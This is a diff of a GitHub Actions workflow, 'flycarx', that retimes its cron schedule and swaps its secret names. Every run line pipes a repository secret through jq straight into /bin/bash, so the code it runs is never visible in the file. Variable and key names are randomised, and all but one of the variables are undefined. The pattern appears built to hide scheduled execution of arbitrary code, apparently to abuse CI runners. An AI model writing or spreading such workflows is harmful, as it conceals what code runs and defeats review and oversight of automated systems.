@@ -2,30 +2,30 @@ name: flycarx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
+    - cron: '56 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: flycarx
         env:
-          cw7: ${{ secrets.cw7 }}
+          btd22: ${{ secrets.btd22 }}
         run: |
-          echo $cw7 | jq -r .m149 | /bin/bash
-          echo $cllt26743 | jq -r .j9 | /bin/bash
-          echo $xt9474 | jq -r .x16 | /bin/bash
-          echo $wrywh6265 | jq -r .oyy4536 | /bin/bash
-          echo $ml2 | jq -r .t917 | /bin/bash
-          echo $l64472 | jq -r .e13 | /bin/bash
-          echo $nla7 | jq -r .u02 | /bin/bash
-          echo $nccgl0289 | jq -r .xje0 | /bin/bash
-          echo $q45644 | jq -r .ka13 | /bin/bash
-          echo $s84399 | jq -r .q73 | /bin/bash
-          echo $p3 | jq -r .nnsis1 | /bin/bash
-          echo $zzob45 | jq -r .cly060 | /bin/bash
-          echo $jiwk1 | jq -r .uhtvw86008 | /bin/bash
-          echo $jjxu17454 | jq -r .yb106 | /bin/bash
-          echo $seen14 | jq -r .vmla466 | /bin/bash
+          echo $btd22 | jq -r .cnh86 | /bin/bash
+          echo $x270 | jq -r .ug1 | /bin/bash
+          echo $gd490 | jq -r .ren58 | /bin/bash
+          echo $cpqz6 | jq -r .wzcy6 | /bin/bash
+          echo $volei8340 | jq -r .mcdi420 | /bin/bash
+          echo $aqskw67 | jq -r .ivdiz17 | /bin/bash
+          echo $hyuk0 | jq -r .xuewr22 | /bin/bash
+          echo $rhiz31972 | jq -r .elb816 | /bin/bash
+          echo $l36 | jq -r .p18 | /bin/bash
+          echo $ayhh22341 | jq -r .kjo8606 | /bin/bash
+          echo $r67619 | jq -r .cz27 | /bin/bash
+          echo $yt7623 | jq -r .bvumd6 | /bin/bash
+          echo $zqppl2098 | jq -r .w105 | /bin/bash
+          echo $nb5 | jq -r .xfell07248 | /bin/bash
 
